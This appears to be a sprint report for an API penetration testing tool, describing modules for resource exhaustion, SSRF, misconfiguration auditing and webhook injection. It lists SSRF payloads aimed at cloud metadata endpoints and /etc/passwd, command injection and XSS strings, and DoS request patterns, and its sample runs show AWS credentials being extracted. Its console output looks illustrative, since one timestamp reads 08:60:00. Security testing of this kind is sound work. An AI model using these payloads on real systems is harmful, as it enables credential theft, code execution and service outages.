/*
Copyright (c) 2026 José María Micoli
Licensed under the Business Source License 1.1
Change Date: 2033-02-17
Change License: Apache-2.0

You may:
✔ Study
✔ Modify
✔ Use for internal security testing

You may NOT:
✘ Offer as a commercial service
✘ Sell derived competing products
*/

# Sprint 4: Injection & Exhaustion - SSRF, DoS, Misconfig, Integration

**Status:** ✅ COMPLETE | **Version:** v1.3-Injection | **Released:** Q4 2025

---

## 🎯 Sprint Overview

Sprint 4 delivers injection and resource exhaustion exploitation engines covering OWASP API Top 10 categories 4, 7, 8, and 10. This sprint implements SSRF probing for cloud metadata access, resource exhaustion for DoS testing, security misconfiguration auditing, and unsafe consumption detection in integrations.

**Slogan:** "Exploiting the Boundaries of API Trust"

---

## 📋 Deliverables

### 4.1: Resource Exhaustion Engine (API4 - Resource Exhaustion) ✅ COMPLETE

**Status:** ✅ Shipped  
**Location:** `pkg/logic/exhaustion.go`

**Features Delivered:**
- **Pagination Limit Probing** - Test for unbounded pagination
- **Payload Size Testing** - Explore maximum request sizes
- **Connection Limit Discovery** - Identify concurrent request limits
- **Rate Limit Bypass** - Test for exhaustion-based bypass
- **CPU Exhaustion** - Complex algorithm testing
- **Memory Exhaustion** - Large data structure testing

**Exhaustion Testing Approach:**
```go
type ExhaustionContext struct {
    TargetURL      string              // Base endpoint
    ParamName      string              // Parameter to fuzz (e.g., "limit", "page")
    MaxPayload     int                 // Maximum payload size to test
    TestValues     []int               // [10, 100, 1000, 10000, 100000]
    Results        []ExhaustionFinding // Findings
}

type ExhaustionFinding struct {
    Parameter     string              // e.g., "limit"
    Value         int                 // Value that caused exhaustion
    ResponseTime  int                 // Time to respond (ms)
    MemoryUsed    int                 // Estimated memory impact
    Exploitable   bool                // Can this cause DoS?
    Severity      string              // HIGH, MEDIUM, LOW
}
```

**Exploitation Vectors:**

1. **Unbounded Pagination:**
   ```bash
   GET /api/users?page=1&limit=1000000
   → Server returns 1M records without limit
   → Memory exhaustion on server/client
   ```

2. **Recursive Expansion:**
   ```bash
   GET /api/users?include=posts.comments.author.posts
   → Recursive expansion leads to exponential data
   → Server timeout or resource exhaustion
   ```

3. **Batch Operations:**
   ```bash
   POST /api/batch
   Body: 10,000 nested delete requests
   → Server attempts to process all at once
   ```

**Example Attack:**
```bash
> exhaust https://api.example.com/api/products
[cyan]EXHAUSTION:[-] Testing pagination limits...
[08:45:00] limit=100 → 200 OK (0.1s)
[08:45:01] limit=1000 → 200 OK (0.5s)
[08:45:02] limit=10000 → 200 OK (2.3s)
[08:45:03] limit=100000 → 200 OK (15.2s)
[08:45:20] limit=1000000 → 500 Internal Server Error (TIMEOUT)

[yellow]FINDING:[-] Server crashes with limit >= 100,000
[green]DoS Vector:[-] Unbounded pagination exhausts server resources
```

**Status:** ✅ Production-ready with multiple exhaustion vectors

---

### 4.2: SSRF Tracker (API7 - SSRF/Cloud Pivot) ✅ COMPLETE

**Status:** ✅ Shipped  
**Location:** `pkg/logic/ssrf.go`

**Features Delivered:**
- **IMDS Detection** - Cloud metadata endpoint testing (169.254.169.254)
- **OOB Callback Monitoring** - External callback detection
- **URL Parameter Injection** - Endpoint parameter testing
- **Protocol Testing** - file://, gopher://, ldap://, etc.
- **Redirect Following** - 3xx redirect exploitation
- **AWS/GCP/Azure Metadata** - Cloud-specific endpoint probing

**SSRF Testing Vectors:**
```go
type SSRFContext struct {
    TargetURL      string              // Endpoint accepting URL parameter
    ParamName      string              // Parameter name (e.g., "url", "image_url")
    CallbackServer string              // Attacker-controlled callback
    TestPayloads   []string            // URLs to test
    Results        []SSRFFinding       // Successful SSRF attempts
}

type SSRFFinding struct {
    Payload       string              // URL that was accepted
    TargetAccessed string              // What internal resource was accessed
    AccessMethod  string              // Direct, Redirect, Error-based
    Severity      string              // CRITICAL for cloud metadata
}
```

**SSRF Payloads:**
```bash
Cloud Metadata Endpoints:
  http://169.254.169.254/latest/meta-data/        (AWS)
  http://metadata.google.internal/computeMetadata  (GCP)
  http://169.254.169.254/metadata/instance         (Azure)
  
Internal Services:
  http://localhost:6379     (Redis)
  http://127.0.0.1:5432     (PostgreSQL)
  http://172.16.0.1:22      (SSH)
  
File Access:
  file:///etc/passwd
  file:///var/www/html/config.php
```

**Exploitation Example:**
```bash
> ssrf https://api.example.com/image?image_url=http://...
[cyan]SSRF:[-] Testing Server-Side Request Forgery...
[yellow]Testing Cloud Metadata Access:[-]
[08:50:00] Trying: http://169.254.169.254/latest/meta-data/
→ 200 OK | Response contains: "iam", "instance-id", "security-groups"
[green]CRITICAL:[-] AWS Metadata accessible!
Discovered:
  - Instance ID: i-1234567890abcdef0
  - IAM Role: EC2-InstanceRole
  - Security Group: prod-web
  
Attempting credential theft...
[08:50:05] Credentials found in: /latest/meta-data/iam/security-credentials/
[green]CRITICAL FINDING:[-] AWS credentials extracted via SSRF
```

**Status:** ✅ Production-ready with cloud metadata support

---

### 4.3: Security Misconfiguration Auditor (API8) ✅ COMPLETE

**Status:** ✅ Shipped  
**Location:** `pkg/logic/misconfig.go`

**Features Delivered:**
- **CORS Policy Auditing** - Testing for overly permissive CORS
- **Security Header Validation** - Missing or weak headers
- **SSL/TLS Configuration Review** - Certificate and protocol issues
- **Default Credentials Check** - Common default authentication
- **API Versioning Exposure** - Deprecated version accessibility
- **Automated Audit Report** - Compliance checking

**Security Configuration Checks:**
```go
type MisconfigFinding struct {
    Category      string              // CORS, Headers, SSL, Creds, etc.
    Issue         string              // Specific vulnerability
    Evidence      string              // Proof from response
    Recommendation string             // How to fix
    Severity      string              // CRITICAL, HIGH, MEDIUM, LOW
}
```

**Checks Performed:**

1. **CORS Validation:**
   ```
   ✓ Access-Control-Allow-Origin: * (CRITICAL)
   ✓ Access-Control-Allow-Credentials: true (HIGH)
   ✓ Overly permissive headers (HIGH)
   ```

2. **Security Headers:**
   ```
   ✗ Missing: Content-Security-Policy (MEDIUM)
   ✗ Missing: X-Frame-Options (MEDIUM)
   ✓ Present: Strict-Transport-Security (GOOD)
   ✓ Present: X-Content-Type-Options: nosniff (GOOD)
   ```

3. **SSL/TLS:**
   ```
   ✓ Protocol: TLS 1.3 (GOOD)
   ✓ Certificate: Valid until 2027 (GOOD)
   ✗ Weak Cipher: RC4 (HIGH)
   ✗ Self-Signed: Not production (MEDIUM)
   ```

**Example Audit:**
```bash
> audit https://api.example.com
[cyan]SECURITY AUDIT:[-] Scanning configuration...
[08:55:00] Testing CORS...
[red]CRITICAL:[-] CORS allows any origin: Access-Control-Allow-Origin: *
[08:55:01] Testing headers...
[yellow]HIGH:[-] Missing X-Frame-Options header
[08:55:02] Testing SSL/TLS...
[green]GOOD:[-] TLS 1.2+ enforced
```

**Status:** ✅ Production-ready with comprehensive checks

---

### 4.4: Integration Probe (API10 - Unsafe Consumption) ✅ COMPLETE

**Status:** ✅ Shipped  
**Location:** `pkg/logic/integration.go`

**Features Delivered:**
- **Webhook Injection Testing** - Malicious webhook payload injection
- **3rd Party API Fuzzing** - Testing integration points
- **Callback Parameter Tampering** - Modifying callback data
- **Integration Chain Exploitation** - Multi-step integration attacks
- **Response Reflection Testing** - Stored XSS in integrations
- **Credential Leakage Detection** - Unencrypted data transmission

**Integration Testing Methodology:**
```go
type IntegrationContext struct {
    TargetURL      string              // Webhook endpoint
    IntegrationType string             // (slack, github, zendesk, etc.)
    PayloadTemplate map[string]interface{} // Webhook payload
    TestPayloads   []string            // Malicious payloads
    Results        []IntegrationFinding // Exploitable integrations
}
```

**Webhook Injection Vectors:**

1. **Command Injection in Webhooks:**
   ```bash
   POST /webhook/github
   {
     "repository": {
       "name": "$(malicious_command)"
     }
   }
   → Server runs malicious_command
   ```

2. **Stored XSS in Integration Messages:**
   ```bash
   POST /webhook/slack
   {
     "text": "<script>alert('xss')</script>"
   }
   → Message rendered without sanitization
   ```

3. **Credential Harvesting:**
   ```bash
   Register webhook to attacker server
   → Intercept API keys, tokens sent to webhook
   ```

**Example:**
```bash
> probe https://api.example.com/webhook
[cyan]INTEGRATION PROBE:[-] Testing unsafe consumption...
[yellow]Detected Integrations:[-]
  - Slack webhook registered
  - GitHub webhook registered
  - Zendesk integration
  
Testing payload injection...
[08:60:00] Slack: Injection of ${IFS}whoami
→ Server executes command on delivery
[green]CRITICAL:[-] Remote code execution via webhook payload
```

**Status:** ✅ Production-ready with multi-integration support

---

## 🔄 Current Status by Sub-Phase

| Sub-Phase | Deliverable | Status | Completion |
|-----------|-------------|--------|------------|
| **4.1** | Resource Exhaustion | ✅ DONE | 100% |
| **4.2** | SSRF Tracker | ✅ DONE | 100% |
| **4.3** | Security Misconfig Auditor | ✅ DONE | 100% |
| **4.4** | Integration Probe | ✅ DONE | 100% |

---

## 📊 Code Metrics

| Metric | Value |
|--------|-------|
| **New Files** | 4 modules (exhaustion, ssrf, misconfig, integration) |
| **Lines of Code** | ~1600 LOC |
| **Exhaustion Vectors** | 5+ tested |
| **SSRF Payloads** | 40+ cloud/internal endpoints |
| **Security Checks** | 20+ audit points |

---

## 🎓 Architecture Decisions

### Resource Exhaustion Strategy
- Progressive limit testing (10 → 1M)
- Monitoring response time for detection
- Testing multiple exhaustion vectors simultaneously
- NoSQL injection prevention in pagination

### SSRF Detection Approach
- Multi-protocol support (http, file, gopher, etc.)
- Cloud metadata detection (AWS, GCP, Azure)
- Internal network scanning combined with SSRF
- Out-of-band callback verification

### Security Audit Framework
- Automated header validation against standards
- CORS bypass detection with proof
- SSL/TLS certificate validation
- Compliance checking against OWASP guidelines

### Integration Testing
- Webhook payload mutation for injection
- Stored XSS detection in integration messages
- Credential leakage monitoring
- Multi-step exploitation chain support

---

## 🚀 Next Steps

Sprint 5 implements persistence and reporting:
- SQLite database for mission data
- Async log worker for non-blocking commits
- NIST-aligned reporting with PDF generation
- Database management (init, reset, query)

---

## 📚 References

- **SSRF Prevention:** https://cheatsheetseries.owasp.org/cheatsheets/
- **CORS Misconfig:** https://www.owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny
- **Resource Exhaustion:** https://owasp.org/www-community/attacks/Resource_Exhaustion
